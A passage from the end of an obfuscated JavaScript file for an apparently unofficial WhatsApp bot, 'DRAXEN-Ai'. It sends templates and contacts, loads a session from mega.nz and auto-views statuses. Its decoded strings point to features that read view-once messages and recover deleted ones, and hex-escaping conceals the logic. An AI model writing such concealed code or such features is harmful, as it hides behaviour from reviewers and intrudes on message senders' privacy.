            '\x75\x70\x6c\x6f\x61\x64': _0x25f52f['\x77\x61\x55\x70\x6c\x6f\x61\x64\x54\x6f\x53\x65\x72\x76\x65\x72']
        });
        var _0x12983f = generateWAMessageFromContent(_0x468d8a, proto[_0x36da37('\x30\x78\x31\x30\x33')][_0x36da37(0x256)]({
            '\x74\x65\x6d\x70\x6c\x61\x74\x65\x4d\x65\x73\x73\x61\x67\x65': {
                '\x68\x79\x64\x72\x61\x74\x65\x64\x54\x65\x6d\x70\x6c\x61\x74\x65': {
                    '\x69\x6d\x61\x67\x65\x4d\x65\x73\x73\x61\x67\x65': _0xf8d3b2['\x69\x6d\x61\x67\x65\x4d\x65\x73\x73\x61\x67\x65'],
                    '\x68\x79\x64\x72\x61\x74\x65\x64\x43\x6f\x6e\x74\x65\x6e\x74\x54\x65\x78\x74': _0x3b9472,
                    '\x68\x79\x64\x72\x61\x74\x65\x64\x46\x6f\x6f\x74\x65\x72\x54\x65\x78\x74': _0xb77bad,
                    '\x68\x79\x64\x72\x61\x74\x65\x64\x42\x75\x74\x74\x6f\x6e\x73': _0x510ba8
                }
            }
        }), _0x27ddc0);
        _0x25f52f[_0x36da37('\x30\x78\x32\x37\x31')](_0x468d8a, _0x12983f['\x6d\x65\x73\x73\x61\x67\x65'], {
            '\x6d\x65\x73\x73\x61\x67\x65\x49\x64': _0x12983f[_0x36da37(0xec)]['\x69\x64']
        });
    }, _0x25f52f[_0x53f6bb(0x227)] = (_0x165959, _0x47a327 = ![]) => {
        const _0xcedb18 = _0x53f6bb;
        id = _0x25f52f['\x64\x65\x63\x6f\x64\x65\x4a\x69\x64'](_0x165959), _0x47a327 = _0x25f52f['\x77\x69\x74\x68\x6f\x75\x74\x43\x6f\x6e\x74\x61\x63\x74'] || _0x47a327;
        let _0x37f063;
        if (id[_0xcedb18(0x288)](_0xcedb18(0xfc))) return new Promise(async _0x47c839 => {
            const _0x485c01 = _0xcedb18;
            _0x37f063 = store[_0x485c01('\x30\x78\x31\x64\x62')][id] || {};
            if (!(_0x37f063['\x6e\x61\x6d\x65'][_0x485c01('\x30\x78\x31\x30\x37')] || _0x37f063[_0x485c01('\x30\x78\x32\x32\x65')])) _0x37f063 = _0x25f52f[_0x485c01('\x30\x78\x31\x66\x64')](id) || {};
            _0x47c839(_0x37f063['\x6e\x61\x6d\x65'] || _0x37f063[_0x485c01('\x30\x78\x32\x32\x65')] || PhoneNumber('\x2b' + id[_0x485c01(0x189)](_0x485c01(0x259), ''))[_0x485c01(0x24f)](_0x485c01('\x30\x78\x31\x30\x30')));
        });
        else _0x37f063 = id === '\x30\x40\x73\x2e\x77\x68\x61\x74\x73\x61\x70\x70\x2e\x6e\x65\x74' ? {
            '\x69\x64': id,
            '\x6e\x61\x6d\x65': '\x57\x68\x61\x74\x73\x41\x70\x70'
        } : id === _0x25f52f['\x64\x65\x63\x6f\x64\x65\x4a\x69\x64'](_0x25f52f[_0xcedb18(0x29b)]['\x69\x64']) ? _0x25f52f[_0xcedb18('\x30\x78\x32\x39\x62')] : store['\x63\x6f\x6e\x74\x61\x63\x74\x73'][id] || {};
        return (_0x47a327 ? '' : _0x37f063['\x6e\x61\x6d\x65']) || _0x37f063[_0xcedb18(0x22e)] || _0x37f063[_0xcedb18('\x30\x78\x31\x31\x31')] || PhoneNumber('\x2b' + _0x165959[_0xcedb18(0x189)]('\x40\x73\x2e\x77\x68\x61\x74\x73\x61\x70\x70\x2e\x6e\x65\x74', ''))[_0xcedb18('\x30\x78\x32\x34\x66')](_0xcedb18('\x30\x78\x31\x30\x30'));
    }, _0x25f52f[_0x53f6bb(0x1b2)] = async (_0x4ed81c, _0x5ac13c, _0x5835b6 = '', _0x151ec0 = {}) => {
        const _0x5ddce7 = _0x53f6bb;
        let _0x7e925a = [];
        for (let _0x2b6cba of _0x5ac13c) {
            _0x7e925a[_0x5ddce7('\x30\x78\x31\x34\x38')]({
                '\x64\x69\x73\x70\x6c\x61\x79\x4e\x61\x6d\x65': await _0x25f52f[_0x5ddce7('\x30\x78\x32\x32\x37')](_0x2b6cba + _0x5ddce7(0x259)),
                '\x76\x63\x61\x72\x64': _0x5ddce7('\x30\x78\x31\x32\x32') + await _0x25f52f[_0x5ddce7(0x227)](_0x2b6cba + _0x5ddce7('\x30\x78\x32\x35\x39')) + _0x5ddce7(0x26a) + global['\x4f\x77\x6e\x65\x72\x4e\x61\x6d\x65'] + _0x5ddce7(0x19e) + _0x2b6cba + '\x3a' + _0x2b6cba + _0x5ddce7(0x291) + global[_0x5ddce7(0x287)] + _0x5ddce7('\x30\x78\x31\x35\x38') + global[_0x5ddce7('\x30\x78\x31\x30\x38')] + _0x5ddce7(0x261) + global[_0x5ddce7('\x30\x78\x31\x31\x39')] + _0x5ddce7('\x30\x78\x31\x61\x37')
            });
        }
        _0x25f52f[_0x5ddce7(0x139)](_0x4ed81c, {
            '\x63\x6f\x6e\x74\x61\x63\x74\x73': {
                '\x64\x69\x73\x70\x6c\x61\x79\x4e\x61\x6d\x65': _0x7e925a[_0x5ddce7('\x30\x78\x31\x63\x35')] + '\x20\x43\x6f\x6e\x74\x61\x63\x74',
                '\x63\x6f\x6e\x74\x61\x63\x74\x73': _0x7e925a
            },
            ..._0x151ec0
        }, {
            '\x71\x75\x6f\x74\x65\x64': _0x5835b6
        });
    }, _0x25f52f[_0x53f6bb('\x30\x78\x66\x36')] = _0x4f79e3 => {
        const _0x2c7b97 = _0x53f6bb;
        return _0x25f52f[_0x2c7b97(0xf0)]({
            '\x74\x61\x67': '\x69\x71',
            '\x61\x74\x74\x72\x73': {
                '\x74\x6f': _0x2c7b97(0x259),
                '\x74\x79\x70\x65': _0x2c7b97('\x30\x78\x31\x63\x61'),
                '\x78\x6d\x6c\x6e\x73': '\x73\x74\x61\x74\x75\x73'
            },
            '\x63\x6f\x6e\x74\x65\x6e\x74': [{
                '\x74\x61\x67': _0x2c7b97('\x30\x78\x31\x35\x36'),
                '\x61\x74\x74\x72\x73': {},
                '\x63\x6f\x6e\x74\x65\x6e\x74': Buffer['\x66\x72\x6f\x6d'](_0x4f79e3, _0x2c7b97(0x217))
            }]
        }), _0x4f79e3;
    }, _0x25f52f[_0x53f6bb(0x22c)] = _0x2ed788 => sms(_0x25f52f, _0x2ed788, store);
}
app[_0x32c960(0x11d)]('\x2f', (_0x3ee20b, _0x2b4604) => {
    const _0x54d729 = _0x32c960;
    _0x2b4604[_0x54d729('\x30\x78\x31\x61\x65')](_0x54d729('\x30\x78\x32\x32\x33'));
}), app[_0x32c960('\x30\x78\x31\x66\x62')](port, () => console['\x6c\x6f\x67']('\x53\x65\x72\x76\x65\x72\x20\x6c\x69\x73\x74\x65\x6e\x69\x6e\x67\x20\x6f\x6e\x20\x70\x6f\x72\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x3a' + port)), setTimeout(() => {
    connectToWA();
}, 0xfa0);

function _0x8d4a() {
    const _0x4778af = ['\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67', '\x2e\x62\x69\x6e', '\ud83d\udc68\u200d\ud83e\uddb1', '\x63\x6f\x70\x79\x4e\x46\x6f\x72\x77\x61\x72\x64', '\x40\x67\x2e\x75\x73', '\ud83d\udc41\ufe0f\u200d\ud83d\udde8\ufe0f', '\ud83e\uddd1\u200d\ud83d\udcbb', '\ud83c\udfcc\ufe0f', '\x69\x6e\x74\x65\x72\x6e\x61\x74\x69\x6f\x6e\x61\x6c', '\ud83e\uddd1\u200d\ud83e\uddb0', '\ud83e\uddb8\u200d\u2640\ufe0f', '\x4d\x65\x73\x73\x61\x67\x65', '\ud83d\udc81\u200d\u2640\ufe0f', '\x53\x45\x53\x53\x49\x4f\x4e\x5f\x49\x44', '\ud83d\udc6f\u200d\u2642\ufe0f', '\x6e\x6f\x74\x69\x66\x79', '\x67\x69\x74\x68\x75\x62', '\ud83d\udc69\u200d\ud83d\ude80', '\x50\x6c\x75\x67\x69\x6e\x73\x20\x69\x6e\x73\x74\x61\x6c\x6c\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x20\u2705', '\ud83d\udeec\ufe0f', '\x73\x65\x72\x76\x65\x72', '\x61\x75\x64\x69\x6f\x2f\x6d\x70\x65\x67', '\ud83d\udc86\u200d\u2642\ufe0f', '\ud83c\uddec\ud83c\udde7', '\x73\x74\x69\x63\x6b\x65\x72', '\x76\x65\x72\x69\x66\x69\x65\x64\x4e\x61\x6d\x65', '\x70\x61\x72\x73\x65\x4d\x65\x6e\x74\x69\x6f\x6e', '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66', '\ud83d\udc69\u200d\ud83e\uddb2', '\x65\x70\x68\x65\x6d\x65\x72\x61\x6c\x4d\x65\x73\x73\x61\x67\x65', '\ud83d\udc68\u200d\ud83d\udcbb', '\ud83d\udc68\u200d\u2696\ufe0f', '\x31\x36\x38\x78\x72\x46\x52\x77\x6b', '\x6c\x6f\x63\x61\x74\x69\x6f\x6e', '\ud83c\udfc4\u200d\u2642\ufe0f', '\ud83e\uddcd\u200d\u2640\ufe0f', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x65\x67\x61\x2e\x6e\x7a\x2f\x66\x69\x6c\x65\x2f', '\x67\x65\x74', '\ud83d\udc68\u200d\ud83d\udc67', '\ud83e\udd72\x2c\ud83d\ude02\x2c\ud83d\udc4d\ud83c\udffb\x2c\ud83d\ude42\x2c\ud83d\ude14', '\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc68', '\x63\x72\x65\x64\x73\x2e\x75\x70\x64\x61\x74\x65', '\x42\x45\x47\x49\x4e\x3a\x56\x43\x41\x52\x44\x0a\x56\x45\x52\x53\x49\x4f\x4e\x3a\x33\x2e\x30\x0a\x4e\x3a', '\ud83e\udddf\u200d\u2642\ufe0f', '\x63\x6f\x6e\x74\x65\x78\x74\x49\x6e\x66\x6f', '\x44\x45\x56', '\ud83d\udc68\u200d\ud83d\udcbc', '\ud83d\udd6f\ufe0f', '\ud83d\ude4b\u200d\u2642\ufe0f', '\ud83d\udeb5\u200d\u2642\ufe0f', '\x72\x65\x61\x64\x56\x69\x65\x77\x4f\x6e\x63\x65', '\ud83c\uddea\ud83c\uddf8', '\ud83e\uddd1\u200d\u2696\ufe0f', '\x61\x6c\x6c\x6f\x63', '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d', '\ud83d\udc69\u200d\u2695\ufe0f', '\ud83d\udeb6\u200d\u2642\ufe0f', '\ud83e\uddd4\u200d\u2642\ufe0f', '\ud83e\udddc\u200d\u2640\ufe0f', '\x50\x4f\x52\x54', '\x62\x6f\x64\x79\x2d\x70\x61\x72\x73\x65\x72', '\x73\x65\x6e\x64\x35\x42\x75\x74\x49\x6d\x67', '\ud83d\udc68\u200d\ud83c\udf93', '\ud83e\uddd1\u200d\ud83c\udf93', '\x6d\x61\x70', '\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65', '\ud83d\udc68\u200d\ud83e\uddaf', '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67', '\x6a\x73\x6f\x6e', '\ud83d\ude45\u200d\u2640\ufe0f', '\x6b\x65\x79\x73', '\ud83d\udc69\u200d\ud83d\udd2c', '\x63\x6c\x6f\x73\x65', '\ud83d\udc3b\u200d\u2744\ufe0f', '\x69\x73\x42\x75\x66\x66\x65\x72', '\x2e\x2f\x6c\x69\x62\x2f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73', '\ud83d\udc68\u200d\ud83d\udc66', '\ud83d\udc69\u200d\ud83c\udfa4', '\ud83c\udfcb\ufe0f\u200d\u2640\ufe0f', '\ud83d\udc68\u200d\ud83e\uddbc', '\x70\x75\x73\x68', '\x73\x65\x6e\x64\x54\x65\x78\x74\x57\x69\x74\x68\x4d\x65\x6e\x74\x69\x6f\x6e\x73', '\ud83d\udc68\u200d\ud83c\udfa8', '\ud83d\ude4b\u200d\u2640\ufe0f', '\ud83c\udde6\ud83c\uddfa', '\ud83e\uddd1\u200d\ud83d\udd2c', '\ud83d\udc69\u200d\ud83d\udc66', '\ud83d\udeb6\u200d\u2640\ufe0f', '\x61\x6c\x69\x61\x73', '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x70\x64\x66', '\ud83e\uddd1\u200d\ud83c\udfa4', '\x63\x4d\x6f\x64', '\ud83d\udd75\ufe0f\u200d\u2642\ufe0f', '\x76\x69\x64\x65\x6f\x4d\x65\x73\x73\x61\x67\x65', '\x73\x74\x61\x74\x75\x73', '\ud83d\udc68\u200d\ud83c\udfeb', '\x0a\x69\x74\x65\x6d\x32\x2e\x58\x2d\x41\x42\x4c\x61\x62\x65\x6c\x3a\x47\x69\x74\x48\x75\x62\x0a\x69\x74\x65\x6d\x33\x2e\x55\x52\x4c\x3a\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f', '\ud83d\udc77\u200d\u2640\ufe0f', '\x37\x39\x32\x30\x32\x38\x6d\x4f\x74\x61\x6f\x62', '\x63\x61\x74\x63\x68', '\x74\x6d\x70\x64\x69\x72', '\ud83d\ude46\u200d\u2642\ufe0f', '\x65\x78\x74', '\x73\x65\x6e\x64\x46\x69\x6c\x65\x55\x72\x6c', '\ud83d\udc69\u200d\u2696\ufe0f', '\ud83d\udc69\u200d\ud83d\ude92', '\ud83c\uddf5\ud83c\uddf0', '\ud83e\uddd1\u200d\ud83c\udfa8', '\x73\x65\x6e\x64\x54\x65\x78\x74', '\x77\x72\x69\x74\x65\x46\x69\x6c\x65', '\x61\x73\x44\x6f\x63\x75\x6d\x65\x6e\x74', '\x66\x72\x6f\x6d\x42\x75\x66\x66\x65\x72', '\x70\x61\x74\x68', '\ud83d\udc69\u200d\ud83e\uddaf', '\x73\x65\x6e\x64\x49\x6d\x61\x67\x65\x41\x73\x53\x74\x69\x63\x6b\x65\x72', '\x32\x35\x35\x37\x31\x36\x39\x34\x35\x39\x37\x31', '\x52\x45\x41\x44\x5f\x4d\x45\x53\x53\x41\x47\x45', '\ud83d\udd74\ufe0f', '\x73\x65\x6e\x64\x42\x75\x74\x74\x6f\x6e\x54\x65\x78\x74', '\x46\x69\x72\x65\x66\x6f\x78', '\ud83c\uddeb\ud83c\uddf7', '\x72\x65\x61\x64\x64\x69\x72', '\ud83d\udc69\u200d\ud83c\udfa8', '\ud83e\uddd1\u200d\ud83c\udf3e', '\x6d\x65\x73\x73\x61\x67\x65', '\x77\x61\x2d\x73\x74\x69\x63\x6b\x65\x72\x2d\x66\x6f\x72\x6d\x61\x74\x74\x65\x72', '\x69\x6d\x61\x67\x65\x2f\x77\x65\x62\x70', '\ud83c\udfca\u200d\u2640\ufe0f', '\ud83e\udddb\u200d\u2640\ufe0f', '\x71\x75\x6f\x74\x65\x64\x4d\x65\x73\x73\x61\x67\x65', '\x63\x6f\x6e\x63\x61\x74', '\x68\x65\x61\x64\x65\x72\x73', '\x72\x65\x61\x64\x4d\x65\x73\x73\x61\x67\x65\x73', '\x70\x72\x6f\x6d\x69\x73\x65\x73', '\ud83d\udc68\u200d\ud83d\udd27', '\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63', '\ud83d\udc68\u200d\ud83d\udd2c', '\x2e\x2f\x6c\x69\x62', '\x63\x72\x79\x70\x74\x6f', '\x2e\x2f\x70\x6c\x75\x67\x69\x6e\x73\x2f', '\x41\x55\x54\x4f\x5f\x53\x54\x41\x54\x55\x53\x5f\x4d\x53\x47', '\x44\x65\x6c\x65\x74\x65\x20\x44\x65\x74\x65\x63\x74\x65\x64\x3a', '\ud83d\udc69\u200d\ud83c\udf73', '\ud83d\udc3f\ufe0f', '\x65\x78\x74\x65\x6e\x64\x65\x64\x54\x65\x78\x74\x4d\x65\x73\x73\x61\x67\x65', '\x72\x65\x70\x6c\x61\x63\x65', '\x61\x75\x74\x68\x6f\x72', '\x53\x65\x73\x73\x69\x6f\x6e\x20\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x65\x64\x20\u2705', '\x70\x75\x73\x68\x4e\x61\x6d\x65', '\ud83e\uddd1\u200d\ud83d\udd27', '\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc69', '\x66\x6f\x72\x6d\x61\x74', '\ud83e\udd26\u200d\u2642\ufe0f', '\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66', '\x72\x65\x61\x63\x74', '\x6f\x62\x6a\x65\x63\x74', '\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1', '\ud83d\udea3\u200d\u2640\ufe0f', '\x69\x6e\x63\x6c\x75\x64\x65\x73', '\ud83d\udc69\u200d\ud83d\udc67', '\x64\x6f\x63\x75\x6d\x65\x6e\x74', '\ud83e\udd39\u200d\u2640\ufe0f', '\ud83e\udd38\u200d\u2640\ufe0f', '\ud83d\udc69\u200d\ud83c\udf7c', '\ud83d\udd74\u200d\u2640\ufe0f', '\ud83e\uddd6\u200d\u2640\ufe0f', '\x0a\x69\x74\x65\x6d\x31\x2e\x54\x45\x4c\x3b\x77\x61\x69\x64\x3d', '\x6c\x6f\x67', '\x6d\x61\x63\x4f\x53', '\ud83e\uddd9\u200d\u2642\ufe0f', '\ud83e\uddcf\u200d\u2642\ufe0f', '\ud83d\udd75\ufe0f\u200d\u2640\ufe0f', '\x6d\x65\x73\x73\x61\x67\x65\x73', '\ud83d\udc69\u200d\ud83e\uddb3', '\x6f\x70\x65\x6e', '\x3b\x3b\x3b\x3b\x0a\x69\x74\x65\x6d\x34\x2e\x58\x2d\x41\x42\x4c\x61\x62\x65\x6c\x3a\x52\x65\x67\x69\x6f\x6e\x0a\x45\x4e\x44\x3a\x56\x43\x41\x52\x44', '\ud83d\udc69\u200d\ud83c\udf3e', '\x4d\x4f\x44\x45', '\ud83d\udc77\u200d\u2642\ufe0f', '\x73\x65\x6e\x64\x46\x69\x6c\x65', '\x41\x55\x54\x4f\x5f\x53\x54\x41\x54\x55\x53\x5f\x52\x45\x41\x43\x54', '\ud83d\udd4a\ufe0f', '\x73\x65\x6e\x64', '\ud83d\uddef\ufe0f', '\ud83e\udd39\u200d\u2642\ufe0f', '\ud83d\ude35\u200d\ud83d\udcab', '\x73\x65\x6e\x64\x43\x6f\x6e\x74\x61\x63\x74', '\x73\x69\x6c\x65\x6e\x74', '\ud83e\uddd1\u200d\ud83c\udf84', '\x64\x65\x63\x6f\x64\x65\x4a\x69\x64', '\x43\x55\x53\x54\x4f\x4d\x5f\x52\x45\x41\x43\x54', '\ud83e\uddd1\u200d\ud83e\uddbd', '\x69\x6d\x61\x67\x65\x4d\x65\x73\x73\x61\x67\x65', '\ud83d\udc68\u200d\ud83c\udf73', '\ud83d\udc41\ufe0f', '\x6d\x73\x67', '\ud83d\udc71\u200d\u2640\ufe0f', '\x73\x70\x6c\x69\x74', '\ud83d\udeb4\u200d\u2642\ufe0f', '\x2e\x2f\x64\x61\x74\x61', '\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69', '\ud83e\udddb\u200d\u2642\ufe0f', '\x69\x67\x6e\x6f\x72\x65', '\ud83d\udc70\u200d\u2640\ufe0f', '\x63\x61\x70\x74\x69\x6f\x6e', '\x6c\x65\x6e\x67\x74\x68', '\ud83e\uddd8\u200d\u2642\ufe0f', '\ud83e\uddb8\u200d\u2642\ufe0f', '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67', '\ud83d\udc69\u200d\ud83c\udfed', '\x73\x65\x74', '\x66\x6c\x6f\x6f\x72', '\ud83e\uddd1\u200d\u2695\ufe0f', '\x32\x35\x35\x37\x35\x36\x37\x31\x35\x31\x32\x36', '\ud83e\udd26\u200d\u2640\ufe0f', '\x31\x33\x33\x33\x33\x37\x34\x33\x45\x70\x6e\x6c\x7a\x65', '\ud83d\udc15\u200d\ud83e\uddba', '\ud83e\uddd1\u200d\ud83c\udf7c', '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66', '\ud83c\uddef\ud83c\uddf5', '\x70\x68\x6f\x74\x6f', '\x73\x6c\x69\x63\x65', '\ud83d\udc87\u200d\u2642\ufe0f', '\x43\x55\x53\x54\x4f\x4d\x5f\x52\x45\x41\x43\x54\x5f\x45\x4d\x4f\x4a\x49\x53', '\ud83c\udfde\ufe0f', '\ud83d\udc82\u200d\u2640\ufe0f', '\x73\x74\x61\x72\x74\x73\x57\x69\x74\x68', '\x63\x6f\x6e\x74\x61\x63\x74\x73', '\ud83e\udd35\u200d\u2640\ufe0f', '\ud83e\uddd1\u200d\ud83e\uddb2', '\x76\x69\x64\x65\x6f', '\ud83e\udd3d\u200d\u2640\ufe0f', '\ud83d\ude2e\u200d\ud83d\udca8', '\ud83d\udc69\u200d\ud83d\udcbc', '\ud83e\uddda\u200d\u2640\ufe0f', '\x68\x65\x61\x64', '\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63', '\ud83e\uddd1\u200d\ud83d\udcbc', '\ud83e\uddd1\u200d\ud83e\uddbc', '\x73\x65\x6e\x64\x56\x69\x64\x65\x6f\x41\x73\x53\x74\x69\x63\x6b\x65\x72', '\ud83e\uddde\u200d\u2642\ufe0f', '\x69\x6e\x62\x6f\x78', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x66\x69\x6c\x65\x73\x2e\x63\x61\x74\x62\x6f\x78\x2e\x6d\x6f\x65\x2f\x74\x6d\x6d\x76\x75\x62\x2e\x6a\x70\x67', '\x70\x61\x63\x6b\x6e\x61\x6d\x65', '\ud83d\udc71\u200d\u2642\ufe0f', '\x34\x36\x35\x37\x33\x31\x53\x69\x4f\x73\x4a\x63', '\ud83e\uddcf\u200d\u2640\ufe0f', '\x32\x39\x34\x39\x4b\x43\x74\x51\x78\x41', '\ud83e\udd37\u200d\u2640\ufe0f', '\x61\x75\x64\x69\x6f', '\ud83e\udddd\u200d\u2640\ufe0f', '\x37\x36\x34\x42\x4a\x6a\x70\x4e\x61', '\ud83e\uddd9\u200d\u2640\ufe0f', '\ud83d\udc86\u200d\u2640\ufe0f', '\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68', '\ud83c\udfc3\u200d\u2642\ufe0f', '\x66\x72\x6f\x6d', '\x6d\x65\x73\x73\x61\x67\x65\x73\x2e\x75\x70\x64\x61\x74\x65', '\u2764\ufe0f\u200d\ud83d\udd25', '\x6c\x69\x73\x74\x65\x6e', '\x76\x69\x64\x65\x6f\x2f\x6d\x70\x34', '\x67\x72\x6f\x75\x70\x4d\x65\x74\x61\x64\x61\x74\x61', '\ud83c\udfc3\u200d\u2640\ufe0f', '\ud83d\udc73\u200d\u2640\ufe0f', '\ud83d\udc6e\u200d\u2640\ufe0f', '\x72\x65\x6d\x6f\x74\x65\x4a\x69\x64', '\ud83d\udc68\u200d\ud83e\uddb2', '\ud83e\udd3c\u200d\u2642\ufe0f', '\x67\x65\x74\x46\x69\x6c\x65', '\x50\x52\x45\x46\x49\x58', '\ud83e\uddd1\u200d\ud83c\udfeb', '\x74\x72\x69\x6d', '\x72\x61\x6e\x64\x6f\x6d', '\ud83d\udc68\u200d\ud83e\uddb3', '\x31\x72\x68\x41\x63\x7a\x76', '\ud83e\uddd7\u200d\u2640\ufe0f', '\x75\x6e\x6c\x69\x6e\x6b', '\x69\x6d\x61\x67\x65', '\x36\x30\x4e\x53\x54\x6a\x76\x51', '\x41\x55\x54\x4f\x5f\x53\x54\x41\x54\x55\x53\x5f\x53\x45\x45\x4e', '\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66', '\x73\x65\x6e\x64\x49\x6d\x61\x67\x65', '\x62\x6f\x64\x79', '\ud83d\udc69\u200d\ud83d\udd27', '\ud83e\udd3e\u200d\u2640\ufe0f', '\x44\x52\x41\x58\x45\x4e\x2d\x41\x69\x7e', '\ud83d\udc69\u200d\u2708\ufe0f', '\x75\x74\x66\x2d\x38', '\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66', '\ud83e\udd3d\u200d\u2642\ufe0f', '\ud83d\udeb5\u200d\u2640\ufe0f', '\x73\x65\x6e\x64\x4d\x65\x64\x69\x61', '\x4d\x61\x72\x6b\x65\x64\x20\x6d\x65\x73\x73\x61\x67\x65\x20\x66\x72\x6f\x6d\x20', '\ud83e\uddd1\u200d\ud83d\ude92', '\x63\x61\x74\x65\x67\x6f\x72\x69\x65\x73', '\ud83d\udde3\ufe0f', '\x65\x78\x74\x6e\x61\x6d\x65', '\ud83e\udd3c\u200d\u2640\ufe0f', '\ud83c\udfc4\u200d\u2640\ufe0f', '\x44\x52\x41\x58\x45\x4e\x2d\x41\x69\x20\x53\x54\x41\x52\x54\x45\x44\x20\u2705', '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66', '\x74\x65\x73\x74', '\ud83d\udd90\ufe0f', '\x67\x65\x74\x4e\x61\x6d\x65', '\x61\x78\x69\x6f\x73', '\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68', '\ud83e\uddce\u200d\u2642\ufe0f', '\ud83d\ude4d\u200d\u2640\ufe0f', '\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x4d', '\x50\x6c\x65\x61\x73\x65\x20\x61\x64\x64\x20\x79\x6f\x75\x72\x20\x73\x65\x73\x73\x69\x6f\x6e\x20\x74\x6f\x20\x53\x45\x53\x53\x49\x4f\x4e\x5f\x49\x44\x20\x65\x6e\x76\x20\x21\x21', '\x73\x75\x62\x6a\x65\x63\x74', '\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67', '\ud83d\udc68\u200d\ud83c\udfed', '\x63\x6f\x6d\x6d\x61\x6e\x64\x73', '\ud83d\udc82\u200d\u2642\ufe0f', '\ud83e\udd38\u200d\u2642\ufe0f', '\ud83d\udc69\u200d\ud83e\uddbc', '\ud83e\uddb9\u200d\u2640\ufe0f', '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66', '\ud83d\udc68\u200d\ud83e\uddbd', '\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67', '\ud83d\udcfd\ufe0f', '\x6d\x61\x74\x63\x68\x41\x6c\x6c', '\x76\x69\x65\x77\x4f\x6e\x63\x65\x4d\x65\x73\x73\x61\x67\x65', '\x74\x72\x75\x65', '\x64\x6f\x77\x6e\x6c\x6f\x61\x64', '\x72\x65\x61\x64\x64\x69\x72\x53\x79\x6e\x63', '\ud83e\uddd6\u200d\u2642\ufe0f', '\ud83d\ude4e\u200d\u2640\ufe0f', '\x77\x72\x69\x74\x65\x46\x69\x6c\x65\x53\x79\x6e\x63', '\ud83e\uddd8\u200d\u2640\ufe0f', '\ud83d\udc68\u200d\ud83c\udf3e', '\x76\x69\x65\x77\x4f\x6e\x63\x65', '\x42\x6f\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x65\x64\x20\x74\x6f\x20\x77\x68\x61\x74\x73\x61\x70\x70\x20\u2705', '\x73\x74\x61\x74\x75\x73\x40\x62\x72\x6f\x61\x64\x63\x61\x73\x74', '\ud83e\uddcd\u200d\u2642\ufe0f', '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67', '\ud83d\udd74\u200d\u2642\ufe0f', '\x6d\x69\x6d\x65\x74\x79\x70\x65', '\ud83d\udc70\u200d\u2642\ufe0f', '\ud83d\udea3\u200d\u2642\ufe0f', '\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74', '\u2764\ufe0f\u200d\ud83e\ude79', '\x67\x65\x74\x4e\x75\x6d\x62\x65\x72', '\ud83d\udc68\u200d\ud83c\udfa4', '\x65\x6e\x76', '\x50\x72\x6f\x76\x69\x64\x65\x20\x6d\x65\x20\x77\x69\x74\x68\x20\x61\x20\x71\x75\x65\x72\x79\x20\x74\x6f\x20\x72\x75\x6e\x20\x4d\x61\x73\x74\x65\x72\x21', '\ud83d\udc69\u200d\ud83c\udfeb', '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67', '\ud83e\udd37\u200d\u2642\ufe0f', '\x66\x72\x6f\x6d\x4f\x62\x6a\x65\x63\x74', '\x63\x6f\x6e\x74\x65\x6e\x74\x2d\x74\x79\x70\x65', '\ud83d\udc6e\u200d\u2642\ufe0f', '\x40\x73\x2e\x77\x68\x61\x74\x73\x61\x70\x70\x2e\x6e\x65\x74', '\x67\x69\x66', '\ud83c\udfcb\ufe0f', '\ud83d\udeeb\ufe0f', '\ud83e\uddd1\u200d\ud83c\udfed', '\ud83d\udc87\u200d\u2640\ufe0f', '\ud83e\uddda\u200d\u2642\ufe0f', '\x32\x34\x33\x38\x35\x30\x31\x34\x38\x38\x35\x32', '\x2f\x6b\x68\x61\x6e\x2d\x78\x6d\x64\x0a\x69\x74\x65\x6d\x33\x2e\x58\x2d\x41\x42\x4c\x61\x62\x65\x6c\x3a\x47\x69\x74\x48\x75\x62\x0a\x69\x74\x65\x6d\x34\x2e\x41\x44\x52\x3a\x3b\x3b', '\ud83e\udd35\u200d\u2642\ufe0f', '\ud83d\udc69\u200d\ud83e\uddbd', '\ud83c\udfca\u200d\u2642\ufe0f', '\ud83d\udee3\ufe0f', 